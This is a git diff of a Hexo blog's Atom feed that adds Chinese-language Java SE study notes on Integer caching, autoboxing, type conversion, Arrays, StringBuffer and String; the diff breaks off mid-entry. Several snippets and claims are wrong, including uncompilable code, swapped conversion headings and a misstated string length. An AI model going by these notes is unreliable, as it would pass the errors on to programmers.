@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://liuhaoan.github.io/"/>
-  <updated>2019-04-09T02:18:53.263Z</updated>
+  <updated>2019-04-09T09:22:44.443Z</updated>
   <id>http://liuhaoan.github.io/</id>
   
   <author>
@@ -17,19 +17,375 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>javaSE复习之——Integer中的常见面试题</title>
+    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Integer%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
+    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Integer中的常见面试题/</id>
+    <published>2019-04-09T09:16:38.000Z</published>
+    <updated>2019-04-09T09:22:44.443Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><a id="more"></a><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">package com.heima.wrapclass;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Demo5_Integer</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param args</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)</span> &#123;</span><br><span class="line">Integer i1 = <span class="keyword">new</span> Integer(<span class="number">97</span>);</span><br><span class="line">Integer i2 = <span class="keyword">new</span> Integer(<span class="number">97</span>);</span><br><span class="line">System.<span class="keyword">out</span>.println(i1 == i2);</span><br><span class="line"><span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">System.<span class="keyword">out</span>.println(i1.<span class="keyword">equals</span>(i2));</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"-----------"</span>);</span><br><span class="line"></span><br><span class="line">Integer i3 = <span class="keyword">new</span> Integer(<span class="number">197</span>);</span><br><span class="line">Integer i4 = <span class="keyword">new</span> Integer(<span class="number">197</span>);</span><br><span class="line">System.<span class="keyword">out</span>.println(i3 == i4);</span><br><span class="line"><span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">System.<span class="keyword">out</span>.println(i3.<span class="keyword">equals</span>(i4));</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"-----------"</span>);</span><br><span class="line"></span><br><span class="line">Integer i5 = <span class="number">127</span>;</span><br><span class="line">Integer i6 = <span class="number">127</span>;</span><br><span class="line">System.<span class="keyword">out</span>.println(i5 == i6);</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">System.<span class="keyword">out</span>.println(i5.<span class="keyword">equals</span>(i6));</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"-----------"</span>);</span><br><span class="line"></span><br><span class="line">Integer i7 = <span class="number">128</span>;</span><br><span class="line">Integer i8 = <span class="number">128</span>;</span><br><span class="line">System.<span class="keyword">out</span>.println(i7 == i8);</span><br><span class="line">System.<span class="keyword">out</span>.println(i7.<span class="keyword">equals</span>(i8));</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * -128到127是byte的取值范围,如果在这个取值范围内,自动装箱就不会新创建对象,而是从常量池中获取</span></span><br><span class="line"><span class="comment"> * 如果超过了byte取值范围就会再新创建对象</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * public static Integer valueOf(int i) &#123;</span></span><br><span class="line"><span class="comment">        assert IntegerCache.high &gt;= 127;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//i&gt;= -128 &amp;&amp; i &lt;= 127</span></span><br><span class="line"><span class="comment">        if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)</span></span><br><span class="line"><span class="comment">            return IntegerCache.cache[i + (-IntegerCache.low)];</span></span><br><span class="line"><span class="comment">        return new Integer(i);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>底层代码可以理解成一个数组，这个数组索引0对应着-128、255对应着127，当传入的值在-128 - 127之间时自动装箱时会直接在这个<code>数组中取值</code>，进而<code>引用地址是一样的</code>，所以上面返回了true</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;代码示例&quot;&gt;&lt;a href=&quot;#代码示例&quot; class=&quot;headerlink&quot; title=&quot;代码示例&quot;&gt;&lt;/a&gt;代码示例&lt;/h1&gt;
+    
+    </summary>
+    
+      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
+    
+    
+      <category term="Integer" scheme="http://liuhaoan.github.io/tags/Integer/"/>
+    
+      <category term="Integer面试题" scheme="http://liuhaoan.github.io/tags/Integer%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
+    
+      <category term="面试题" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>javaSE复习之——JDK5新特性之_自动拆箱与装箱</title>
+    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94JDK5%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B-%E8%87%AA%E5%8A%A8%E6%8B%86%E7%AE%B1%E4%B8%8E%E8%A3%85%E7%AE%B1/"/>
+    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——JDK5新特性之-自动拆箱与装箱/</id>
+    <published>2019-04-09T09:13:54.000Z</published>
+    <updated>2019-04-09T09:15:22.581Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="代码详解"><a href="#代码详解" class="headerlink" title="代码详解"></a>代码详解</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x = <span class="number">123</span>;</span><br><span class="line">Integer i1 = <span class="keyword">new</span> Integer(x);</span><br><span class="line"><span class="comment">//手动装箱</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> y = i1.intValue();</span><br><span class="line"><span class="comment">//手动拆箱</span></span><br><span class="line"></span><br><span class="line">Ineger x = <span class="number">123</span>;</span><br><span class="line"><span class="comment">//自动装箱，他的底层是手动装箱</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a = x + <span class="number">100</span>;</span><br><span class="line"><span class="comment">//自动拆箱，他的底层是自动拆箱</span></span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;代码详解&quot;&gt;&lt;a href=&quot;#代码详解&quot; class=&quot;headerlink&quot; title=&quot;代码详解&quot;&gt;&lt;/a&gt;代码详解&lt;/h1&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;
+      
+    
+    </summary>
+    
+      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
+    
+    
+      <category term="新特性" scheme="http://liuhaoan.github.io/tags/%E6%96%B0%E7%89%B9%E6%80%A7/"/>
+    
+      <category term="JDK5" scheme="http://liuhaoan.github.io/tags/JDK5/"/>
+    
+      <category term="自动拆箱" scheme="http://liuhaoan.github.io/tags/%E8%87%AA%E5%8A%A8%E6%8B%86%E7%AE%B1/"/>
+    
+      <category term="自动装箱" scheme="http://liuhaoan.github.io/tags/%E8%87%AA%E5%8A%A8%E8%A3%85%E7%AE%B1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>javaSE复习之——String转换为其他数据类型</title>
+    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94String%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
+    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——String转换为其他数据类型/</id>
+    <published>2019-04-09T09:10:35.000Z</published>
+    <updated>2019-04-09T09:12:42.799Z</updated>
+    
+    <content type="html"><![CDATA[<ul><li><p>代码：</p><blockquote><p>.parseXXX(“”);</p></blockquote></li><li><p>特点：</p><blockquote><p>基本数据类型包装类有八种，其中除了char其他都有<code>.parseXXX()</code>方法，因为char只能存入一个字符。</p></blockquote></li><li><p>代码示例：</p></li></ul><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String <span class="built_in">s1</span> = <span class="string">"123"</span><span class="comment">;</span></span><br><span class="line">int i = Integer.parseInt(<span class="built_in">s1</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;ul&gt;
+&lt;li&gt;&lt;p&gt;代码：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;.parseXXX(“”);&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;特点：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;基本数据类型包装类有八种，其中除了char其他都有&lt;code&gt;.pa
+      
+    
+    </summary>
+    
+      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
+    
+    
+      <category term="String" scheme="http://liuhaoan.github.io/tags/String/"/>
+    
+      <category term="String转换为其他数据类型" scheme="http://liuhaoan.github.io/tags/String%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>javaSE复习之——String与int的相互转换</title>
+    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94String%E4%B8%8Eint%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2/"/>
+    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——String与int的相互转换/</id>
+    <published>2019-04-09T09:04:41.000Z</published>
+    <updated>2019-04-09T09:09:53.670Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="String转int"><a href="#String转int" class="headerlink" title="String转int"></a>String转int</h1><blockquote><p>1、String s1 = 1 + “”；</p><p>2、String s2 = string.toString(1);</p><p>3、Integer i = new Integer(1);        String s1 = i.toString();</p><p>4、String s1 = Integer.toString(1);</p></blockquote><p>ps:推荐用第一第二种方式，代码更简洁。</p><a id="more"></a><h1 id="int转String"><a href="#int转String" class="headerlink" title="int转String"></a>int转String</h1><blockquote><p>1、<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String <span class="built_in">s1</span> = <span class="string">"123"</span><span class="comment">;</span></span><br><span class="line">Integer i = new Integer(<span class="built_in">s1</span>)<span class="comment">;</span></span><br><span class="line">int a = i.intValue()<span class="comment">;</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>2、<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">String</span> s1 = Integer.<span class="built_in">parseInt</span>(<span class="number">123</span>);</span><br></pre></td></tr></table></figure></p></blockquote><p>ps:推荐用第二种</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;String转int&quot;&gt;&lt;a href=&quot;#String转int&quot; class=&quot;headerlink&quot; title=&quot;String转int&quot;&gt;&lt;/a&gt;String转int&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;1、String s1 = 1 + “”；&lt;/p&gt;
+&lt;p&gt;2、String s2 = string.toString(1);&lt;/p&gt;
+&lt;p&gt;3、Integer i = new Integer(1);        String s1 = i.toString();&lt;/p&gt;
+&lt;p&gt;4、String s1 = Integer.toString(1);&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;ps:推荐用第一第二种方式，代码更简洁。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
+    
+    
+      <category term="String与int的相互转换" scheme="http://liuhaoan.github.io/tags/String%E4%B8%8Eint%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2/"/>
+    
+      <category term="String转int" scheme="http://liuhaoan.github.io/tags/String%E8%BD%ACint/"/>
+    
+      <category term="int转String" scheme="http://liuhaoan.github.io/tags/int%E8%BD%ACString/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>javaSE复习之——基本数据类型包装类</title>
+    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8C%85%E8%A3%85%E7%B1%BB/"/>
+    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——基本数据类型包装类/</id>
+    <published>2019-04-09T08:58:32.000Z</published>
+    <updated>2019-04-09T09:03:44.552Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="基本数据类型和包装类的对应表"><a href="#基本数据类型和包装类的对应表" class="headerlink" title="基本数据类型和包装类的对应表"></a>基本数据类型和包装类的对应表</h1><table><thead><tr><th>基本数据类型</th><th>包装类</th></tr></thead><tbody><tr><td>byte</td><td>Byte</td></tr><tr><td>short</td><td>Short</td></tr><tr><td>long</td><td>Long</td></tr><tr><td>float</td><td>Float</td></tr><tr><td>double</td><td>Double</td></tr><tr><td>boolean</td><td>Boolean</td></tr></tbody></table><p>—————–上面的只是改大写，下面的改的更多<br><a id="more"></a></p><table><thead><tr><th>基本数据类型</th><th>包装类</th></tr></thead><tbody><tr><td>int</td><td>Integer</td></tr><tr><td>char</td><td>Character</td></tr></tbody></table><h1 id="Integer的特点："><a href="#Integer的特点：" class="headerlink" title="Integer的特点："></a>Integer的特点：</h1><blockquote><p>1、能在int和String类型之间相互转换</p><p>2、提供了处理int类型时，非常有用的其他一些常量和方法。</p><p>3、能在创建对象时传入String类型的数据，但只<code>限于int值</code>。</p></blockquote>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;基本数据类型和包装类的对应表&quot;&gt;&lt;a href=&quot;#基本数据类型和包装类的对应表&quot; class=&quot;headerlink&quot; title=&quot;基本数据类型和包装类的对应表&quot;&gt;&lt;/a&gt;基本数据类型和包装类的对应表&lt;/h1&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;基本数据类型&lt;/th&gt;
+&lt;th&gt;包装类&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;byte&lt;/td&gt;
+&lt;td&gt;Byte&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;short&lt;/td&gt;
+&lt;td&gt;Short&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;long&lt;/td&gt;
+&lt;td&gt;Long&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;float&lt;/td&gt;
+&lt;td&gt;Float&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;double&lt;/td&gt;
+&lt;td&gt;Double&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;boolean&lt;/td&gt;
+&lt;td&gt;Boolean&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;—————–上面的只是改大写，下面的改的更多&lt;br&gt;
+    
+    </summary>
+    
+      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
+    
+    
+      <category term="基本数据类型包装类" scheme="http://liuhaoan.github.io/tags/%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8C%85%E8%A3%85%E7%B1%BB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>javaSE复习之——Arrays类</title>
+    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Arrays%E7%B1%BB/"/>
+    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Arrays类/</id>
+    <published>2019-04-09T08:51:02.000Z</published>
+    <updated>2019-04-09T08:57:34.400Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Arrays类的概述"><a href="#Arrays类的概述" class="headerlink" title="Arrays类的概述"></a>Arrays类的概述</h1><blockquote><p>它其实就是一个数组的工具类，提供各种关于数组的操作</p></blockquote><a id="more"></a><h1 id="Arrats的方法："><a href="#Arrats的方法：" class="headerlink" title="Arrats的方法："></a>Arrats的方法：</h1><ul><li>.toString()<blockquote><p>数组转换为字符串</p></blockquote></li><li>.sort()<blockquote><p>数组排序</p></blockquote></li><li>.binarySearch()<blockquote><p>二分查找，<code>返回索引值</code>，如果没找到就返回，<code>被查找数据在数组中应该出现的插入点的负数 减去1</code></p><p>前提：这个数组是一个序列数组</p></blockquote></li><li>.asList()<blockquote><p>把数组转换成集合，用List引用。<br>例子：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">List</span>&lt;<span class="keyword">String</span>&gt; l = <span class="keyword">Arrays</span>.asList(数组);</span><br></pre></td></tr></table></figure></blockquote></li></ul><ul><li>数组转集合的意义：<blockquote><p>虽然从<code>数组转换成的集合</code>不能增加和减少，但是我们可以用集合的思想来操作数组，也就是用集合除add、remove以外的方法。</p></blockquote></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;Arrays类的概述&quot;&gt;&lt;a href=&quot;#Arrays类的概述&quot; class=&quot;headerlink&quot; title=&quot;Arrays类的概述&quot;&gt;&lt;/a&gt;Arrays类的概述&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;它其实就是一个数组的工具类，提供各种关于数组的操作&lt;/p&gt;
+&lt;/blockquote&gt;
+    
+    </summary>
+    
+      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
+    
+    
+      <category term="Arrays类" scheme="http://liuhaoan.github.io/tags/Arrays%E7%B1%BB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>javaSE复习之——StringBuffer类</title>
+    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94StringBuffer%E7%B1%BB/"/>
+    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——StringBuffer类/</id>
+    <published>2019-04-09T08:31:59.000Z</published>
+    <updated>2019-04-09T08:49:48.694Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="StringBuffer的概述"><a href="#StringBuffer的概述" class="headerlink" title="StringBuffer的概述"></a>StringBuffer的概述</h1><blockquote><p>1、它是<code>字符串缓冲区</code>（容器），底层默认是长度为16的<code>字符数组</code>。</p><p>2、StringBuffer是<code>线程安全</code>的，StringBuilder是<code>线程不安全</code>的</p><p>3、线程安全速度更<code>慢</code>，线程不安全速度更<code>快</code>。</p></blockquote><a id="more"></a><h1 id="StringBuffer与String的区别"><a href="#StringBuffer与String的区别" class="headerlink" title="StringBuffer与String的区别"></a>StringBuffer与String的区别</h1><blockquote><p>1、String赋的值它是<code>不能被改变的</code>，只能丢弃重新创建，<code>如果字符拼接过多会产生过多的垃圾</code>。</p><p>2、StringBuffer赋的值是<code>可以被改变的</code>，类似字符拼接<code>建议</code>用这个类，因为<code>不会产生过多的垃圾</code>。</p><p>2、虽然它们都是<code>引用数据类型</code>，但是String<code>做参数</code>传递时是和基本数据类型一样的，而StringBuffer传递的只是对创建对象的引用，也就是地址值。</p></blockquote><h1 id="StringBuffer的方法"><a href="#StringBuffer的方法" class="headerlink" title="StringBuffer的方法"></a>StringBuffer的方法</h1><ul><li>属性获取：<blockquote><p>.capacity()<br>返回当前容量</p><p>.length()<br>返回实际长度</p></blockquote></li></ul><ul><li>数据添加：<blockquote><p>.append()<br>把任何数据传入字符串缓冲区，然后返回缓冲区对象本身。</p><p>.insert(索引,字符串)<br>在任意位置之后将任意类型数据插入字符串缓冲取内，返回本身。</p></blockquote></li></ul><ul><li>数据删除：<blockquote><p>.deleteCharAt()<br>删除任意索引的数据，返回本身。</p><p>.delete(索引1,索引2)<br>删除从索引1开始到索引2位置的数据，返回本身。（包含头不包含尾）</p></blockquote></li></ul><ul><li>数据替换反转：<blockquote><p>.reverse()<br>字符反转</p><p>.replace(开始索引，结束索引，要替换的数据)&gt;<br>字符替换</p></blockquote></li></ul><ul><li>数据截取：（截取后返回的数据不是表示容器本身，而是返回一个String）<blockquote><p>.subString(索引)<br>从索引开始，截取到字符串末尾。</p><p>.subString(开始,结尾)<br>从开始位置截取字符串到结尾位置，不包括结尾索引。    </p></blockquote></li></ul><h1 id="StringBuffer的构造方法特点"><a href="#StringBuffer的构造方法特点" class="headerlink" title="StringBuffer的构造方法特点"></a>StringBuffer的构造方法特点</h1><blockquote><p>1、无参构造默认容量为 <code>16个字符</code></p><p>2、传入整数，比如传入10，那么这个容器的<code>容量</code>就为10个字符</p><p>3、传入一个字符串，比如传入：啊啊，那么实际长度为4，<code>字符串缓冲区容量为20</code></p><p>4、如果<code>内部缓冲区溢出</code>，那么容量自动增大。</p><p>5、StringBuffer重写了toString()方法，显示的是它的属性值，也就是它的元素。</p></blockquote><h1 id="StringBuffer注意事项"><a href="#StringBuffer注意事项" class="headerlink" title="StringBuffer注意事项"></a>StringBuffer注意事项</h1><blockquote><p>1、不要利用重新创建另一个对象来试图<code>清空容器</code>，这只是<code>引用了另一个容器对象</code>而已，之前的那个容器并没有被清空，可以利用<code>delete</code>方法清空容器。</p><p>2、因为String与任意字符串<code>相加</code>的底层实现就是使用容器，并且String的值是<code>不能修改的</code>，它只能把之前的数据做垃圾处理重新创建一个数据，这样会<code>不断的产生垃圾</code>，所以在类似 <code>字符串数组</code> 转换成 <code>字符串</code> 或者 <code>字符串拼接</code>（String s = s1 + s2；） 的例程中使用容器最好。</p></blockquote><h1 id="StringBuffer与String的互转："><a href="#StringBuffer与String的互转：" class="headerlink" title="StringBuffer与String的互转："></a>StringBuffer与String的互转：</h1><ul><li>StringBuffer转String<blockquote><p>1、创建一个String对象，把容器传进去。</p><p>2、使用toString()方法。</p><p>3、使用subString()方法。</p></blockquote></li></ul><ul><li>String转StringBuffer<blockquote><p>1、创建一个StringBuffer对象，传入字符串即可。</p><p>2、通过append()方法把字符串加入到容器内。</p></blockquote></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;StringBuffer的概述&quot;&gt;&lt;a href=&quot;#StringBuffer的概述&quot; class=&quot;headerlink&quot; title=&quot;StringBuffer的概述&quot;&gt;&lt;/a&gt;StringBuffer的概述&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;1、它是&lt;code&gt;字符串缓冲区&lt;/code&gt;（容器），底层默认是长度为16的&lt;code&gt;字符数组&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;2、StringBuffer是&lt;code&gt;线程安全&lt;/code&gt;的，StringBuilder是&lt;code&gt;线程不安全&lt;/code&gt;的&lt;/p&gt;
+&lt;p&gt;3、线程安全速度更&lt;code&gt;慢&lt;/code&gt;，线程不安全速度更&lt;code&gt;快&lt;/code&gt;。&lt;/p&gt;
+&lt;/blockquote&gt;
+    
+    </summary>
+    
+      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
+    
+    
+      <category term="StringBuffer类" scheme="http://liuhaoan.github.io/tags/StringBuffer%E7%B1%BB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>javaSE复习之——String类</title>
+    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94String%E7%B1%BB/"/>
+    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——String类/</id>
+    <published>2019-04-09T07:42:02.000Z</published>
+    <updated>2019-04-09T08:31:15.266Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="String类的概述"><a href="#String类的概述" class="headerlink" title="String类的概述"></a>String类的概述</h1><ul><li>它的实例用来存储字符串，在平时的使用中我们会经常用到，通常初学者会以为它是一个<code>基本数据类型</code>，但其实它是一个<code>引用数据类型</code>.</li></ul><a id="more"></a><h1 id="String类特点："><a href="#String类特点：" class="headerlink" title="String类特点："></a>String类特点：</h1><ul><li>1、String实际上是一个类，它重写了toString方法，所以创建String引用后<code>直接输出调用该引用的名称</code>就可以输出<code>字符串</code>数据。</li></ul><ul><li>2、String属于<code>引用数据类型</code>，而不是<code>基本数据类型</code>，基本数据类型为：int、char。。。，所以String数据对比需要用到<code>equals</code>方法，否则会出现判断不准确的问题</li></ul><ul><li>3、String没有set和get方法，所以它<code>不存在修改数据</code>，只能是<code>替换数据</code>，把之前的数据当作垃圾。</li></ul><ul><li>4、String s = “abc”     与 String a = “abc”    它们两个变量其实是记录了<code>常量池中的地址值</code>，而常量池有个特性，就是<code>已有的数据它不会再去创建</code>，所以 <code>s==a为ture</code></li></ul><ul><li>5、<code>String s = &quot;a&quot; + &quot;b&quot; + &quot;c&quot;</code>    同等于<code>String a = &quot;abc&quot;</code>    因为java有<code>常量优化机制</code>，java编译时已经确定<code>s = abc</code>，所以s拿到的是常量abc的地址。</li></ul><ul><li>6、</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String <span class="selector-tag">b</span> = <span class="string">"ab"</span></span><br><span class="line">String c = <span class="string">"abc"</span></span><br><span class="line">c == <span class="selector-tag">a</span> + <span class="string">"c"</span></span><br><span class="line"><span class="comment">//结果为false</span></span><br></pre></td></tr></table></figure><blockquote><p>解析：因为<code>任何数据</code>与<code>字符串用 + 连接</code>，会在堆内存中创建<code>StringBuider</code> 或 <code>StringBuffer</code>缓冲区对象并使用append方法<code>把数据相连</code>，这里会得出：<code>&quot;abc&quot;</code>然后再使用toString方法<code>创建一个“abc”的String对象返回</code>这个”abc”被保存在<code>堆内存</code>中，而不是保存在<code>常量池</code>，所以变量c的值是<code>常量池</code>中的地址，而a + “c”是<code>堆内存</code>中的地址，所以用“==”号做比较返回false</p></blockquote><ul><li>7、String赋的值是<code>不可以被改变的</code>，只有把之前的值丢弃变成垃圾后，再赋新的值。</li></ul><ul><li>8、String虽然是<code>引用数据类型</code>，但是它当作参数传递的时候，它是和基本数据类型一样的。</li></ul><h1 id="获取键盘输入String需要注意的"><a href="#获取键盘输入String需要注意的" class="headerlink" 